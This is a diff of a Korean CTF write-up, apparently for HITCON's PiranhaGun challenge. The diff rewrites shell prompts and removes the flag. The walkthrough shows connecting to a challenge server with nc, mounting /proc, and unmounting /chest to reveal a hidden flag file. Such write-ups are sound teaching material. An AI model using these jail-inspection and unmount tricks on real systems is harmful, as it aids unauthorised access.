@@ -8,17 +8,18 @@
 .. code-block:: console
 
     $ nc 54.178.235.243 10004    
+
     bash: cannot set terminal process group (-1): Inappropriate ioctl for device
     bash: no job control in this shell
     bash: /root/.bashrc: Permission denied
 
-    root@ip-172-31-19-201:/home/PiranhaGun#
+    
 
 폴더 안을 보니 README라는 파일이 하나 있네요.
 
 .. code-block:: console
 
-    root@ip-172-31-19-201:/home/PiranhaGun# ls
+    $ ls
     ls
     README
 
@@ -26,7 +27,8 @@
 
 .. code-block:: console
 
-    root@ip-172-31-19-201:/home/PiranhaGun# cat README
+    $ cat README
+
     cat README
     The Piranha Gun can be found in "jungle.chest".
 
@@ -34,7 +36,8 @@
 
 .. code-block:: bash
 
-    root@ip-172-31-19-201:/home/PiranhaGun# ps aux
+    $ ps aux
+
     ps aux
     Error, do this: mount -t proc proc /proc
 
@@ -42,9 +45,12 @@
 
 .. code-block:: console
 
-    root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc
+    $ mount -t proc proc /proc
+
     mount -t proc proc /proc
-    root@ip-172-31-19-201:/home/PiranhaGun# ps aux
+    
+    $ ps aux
+
     ps aux
     USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
     root         1  0.0  0.0   2116    56 ?        S    00:17   0:00 wrapper root 0 600 262144 /home/PiranhaGun /bin/bash -i
@@ -55,7 +61,8 @@
 
 .. code-block:: console
 
-    root@ip-172-31-19-201:/home/PiranhaGun# cat /proc/mounts
+    $ cat /proc/mounts
+
     cat /proc/mounts
     /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d / ext4 rw,relatime,discard,data=ordered 0 0
     udev /dev devtmpfs rw,relatime,size=15702768k,nr_inodes=3925692,mode=755 0 0
@@ -90,11 +97,16 @@ chest 폴더에 디렉토리가 아무것도 없는 데 umount로 마운트를 �
 
 .. code-block:: console
 
-    root@ip-172-31-19-201:/home/PiranhaGun# ls /chest
+    $ ls /chest
+    
     ls /chest
-    root@ip-172-31-19-201:/home/PiranhaGun# umount /chest
+
+    $ umount /chest
+
     umount /chest
-    root@ip-172-31-19-201:/home/PiranhaGun# ls -al /chest
+    
+    $ ls -al /chest
+
     ls -al /chest
     total 12
     drwxr-xr-x  2 nobody nogroup 4096 Oct 16 13:31 .
@@ -105,7 +117,8 @@ chest 폴더에 디렉토리가 아무것도 없는 데 umount로 마운트를 �
 
 .. code-block:: bash
 
-    root@ip-172-31-19-201:/home/PiranhaGun# cat /chest/jungle.chest
+    $ cat /chest/jungle.chest
+
     cat /chest/jungle.chest
     
-hitcon{Wh1re d!d Y0u F1nd the Jungle Key}
+    
